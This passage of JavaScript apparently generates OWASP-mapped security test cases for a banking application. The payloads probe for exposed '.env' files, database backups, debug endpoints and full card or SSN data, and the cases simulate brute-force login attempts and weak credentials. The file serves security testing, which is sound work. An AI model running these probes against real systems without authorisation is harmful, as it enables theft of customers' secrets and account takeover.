          description: pathTest.description,
          owasp: 'A01:2021 - Broken Access Control',
          severity: 'high',
          bankingImpact: 'Access to sensitive customer data, configuration files, credentials'
        };
        break;
        
      case 'sensitive_data_exposure':
        testData = {
          ...testData,
          payload: {
            requests: [
              { url: '/api/customers?include_ssn=true', description: 'Force sensitive data inclusion' },
              { url: '/debug/session', description: 'Access debug endpoint' },
              { url: '/api/transactions?format=csv&full_card=true', description: 'Full card number exposure' },
              { url: '/.env', description: 'Environment variables' },
              { url: '/backup/customers.sql', description: 'Database backup' }
            ]
          },
          description: 'Attempt to access sensitive data through various endpoints',
          owasp: 'A02:2021 - Cryptographic Failures',
          severity: 'critical',
          bankingImpact: 'Exposure of SSN, card numbers, PINs, account details'
        };
        break;
        
      case 'broken_authentication':
        testData = {
          ...testData,
          payload: {
            scenarios: [
              { test: 'No rate limiting', attempts: 10000, description: 'Brute force attack' },
              { test: 'Weak password', password: '123456', description: 'Common password' },
              { test: 'No session timeout', duration: '24 hours', description: 'Long-lived sessions' },
              { test: 'Password in URL', url: 'https://bank.com/login?user=john&pass=secret', description: 'Credentials in GET' },
              { test: 'Predictable session ID', sessionId: 'user123session456', description: 'Sequential session IDs' }
            ]
          },
          description: 'Broken authentication mechanisms',
          owasp: 'A07:2021 - Identification and Authentication Failures',
          severity: 'critical',
          bankingImpact: 'Account takeover, credential stuffing, session hijacking'
        };
        break;
    }
    
    return testData;
  }
}
